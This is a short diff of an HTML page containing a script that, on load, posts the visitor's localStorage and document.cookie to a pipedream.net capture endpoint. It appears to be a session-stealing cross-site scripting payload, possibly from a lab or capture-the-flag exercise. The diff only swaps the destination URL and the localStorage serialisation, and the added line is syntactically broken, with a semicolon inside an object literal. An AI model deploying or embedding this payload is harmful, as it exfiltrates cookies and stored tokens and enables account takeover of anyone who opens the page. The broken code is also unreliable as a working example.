@@ -1,10 +1,10 @@
 <html>
   <body>
     <script>
-      fetch("https://enw16o5nmiis8.x.pipedream.net/", {
+      fetch("https://eomm4clj55fhphi.m.pipedream.net", {
         method: "post",
         body: JSON.stringify({
-          cool: Object.entries(localStorage),
+          cool: JSON.stringify(localStorage);
           cookie: document.cookie,
         }),
       });
